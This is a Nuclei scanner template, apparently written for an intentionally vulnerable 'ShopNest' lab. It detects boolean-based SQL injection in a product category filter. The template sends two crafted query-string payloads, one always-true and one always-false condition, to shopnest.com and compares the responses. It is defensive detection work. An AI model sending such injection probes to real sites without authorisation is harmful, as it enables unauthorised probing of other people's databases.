id: shopnest-category-sqli

info:
  name: ShopNest Category Boolean SQL Injection
  author: codex
  severity: high
  description: Detects the intentionally vulnerable ShopNest lab category filter using safe boolean SQL injection checks.
  tags: sqli,boolean,shopnest,lab

http:
  - raw:
      - |
        GET /products/?category=Electronics%27%20AND%201337%3D1337%20AND%20%27a%27%3D%27a HTTP/1.1
        Host: shopnest.com
        User-Agent: nuclei-shopnest-lab
        Accept: */*
      - |
        GET /products/?category=Electronics%27%20AND%201337%3D7331%20AND%20%27a%27%3D%27a HTTP/1.1
        Host: shopnest.com
        User-Agent: nuclei-shopnest-lab
        Accept: */*
    req-condition: true
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_1, 'Wireless Noise-Cancelling Headphones')"
          - "contains(body_1, 'Mechanical Keyboard TKL')"
          - "contains(body_2, 'No products found')"
        condition: and
